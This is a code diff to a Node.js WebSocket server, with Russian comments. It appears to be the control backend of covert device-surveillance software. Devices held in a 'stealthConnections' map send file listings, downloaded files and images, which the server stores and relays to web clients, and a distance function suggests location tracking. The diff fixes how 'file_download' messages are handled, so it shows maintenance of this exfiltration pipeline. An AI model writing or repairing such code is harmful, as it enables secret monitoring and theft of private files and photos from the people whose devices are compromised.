@@ -91,62 +91,60 @@ wss.on("connection", (ws, req) => {
     console.log(`📱 Device ${deviceId} connected`);
 
     ws.on("message", (rawData) => {
-      try {
-        const msg = JSON.parse(rawData.toString());
-        
-        if (msg.type === 'ping') {
-          console.log(`💓 Ping from ${deviceId}`);
-          return;
-        }
-        
-        if (msg.type === 'file_list') {
-  deviceFileCache.set(deviceId, {
-    data: msg.data,
-    timestamp: Date.now()
-  });
-  
-  // ИСПРАВЛЕНО: безопасный доступ к total
-  const totalFiles = (msg.data && msg.data.total) || 0;
-  console.log(`📁 Received file list from ${deviceId}: ${totalFiles} files`);
-  return;
-}
+  try {
+    const msg = JSON.parse(rawData.toString());
+    
+    if (msg.type === 'ping') {
+      console.log(`💓 Ping from ${deviceId}`);
+      return;
+    }
+    
+    if (msg.type === 'file_list') {
+      deviceFileCache.set(deviceId, {
+        data: msg.data,
+        timestamp: Date.now()
+      });
+      
+      const totalFiles = (msg.data && msg.data.total) || 0;
+      console.log(`📁 Received file list from ${deviceId}: ${totalFiles} files`);
+      return;
+    }
 
-        // В обработчике WebSocket для устройств добавьте:
-if (msg.type === 'file_download') {
-  console.log(`📥 Received file: ${msg.filename} from ${deviceId}`);
-  
-  // Транслируем файл веб-клиентам
-  broadcastToWebClients({
-    type: 'file_download',
-    deviceId: deviceId,
-    filename: msg.filename,
-    data: msg.data,
-    size: msg.size,
-    timestamp: msg.timestamp || Date.now()
-  });
-  
-  return;
-}
-        
-        if (msg.type === 'image') {
-          const deviceInfo = stealthConnections.get(deviceId);
-          if (deviceInfo) {
-            deviceInfo.latestImage = msg.data;
-            deviceInfo.latestImageTime = Date.now();
-          }
-        }
-        
-        broadcastToWebClients({
-          type: msg.type,
-          deviceId: deviceId,
-          data: msg.data,
-          timestamp: msg.timestamp || Date.now()
-        });
-        
-      } catch (err) {
-        console.error(`Error from device ${deviceId}:`, err);
+    // ПЕРЕМЕСТИТЕ file_download СЮДА (вынесите из file_list)
+    if (msg.type === 'file_download') {
+      console.log(`📥 Received file: ${msg.filename} from ${deviceId}`);
+      
+      broadcastToWebClients({
+        type: 'file_download',
+        deviceId: deviceId,
+        filename: msg.filename,
+        data: msg.data,
+        size: msg.size,
+        timestamp: msg.timestamp || Date.now()
+      });
+      
+      return;
+    }
+    
+    if (msg.type === 'image') {
+      const deviceInfo = stealthConnections.get(deviceId);
+      if (deviceInfo) {
+        deviceInfo.latestImage = msg.data;
+        deviceInfo.latestImageTime = Date.now();
       }
+    }
+    
+    broadcastToWebClients({
+      type: msg.type,
+      deviceId: deviceId,
+      data: msg.data,
+      timestamp: msg.timestamp || Date.now()
     });
+    
+  } catch (err) {
+    console.error(`Error from device ${deviceId}:`, err);
+  }
+});
 
     ws.on("close", () => {
       stealthConnections.delete(deviceId);
@@ -519,6 +517,7 @@ function getDistance(lat1, lon1, lat2, lon2) {
 server.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+
 
 
 
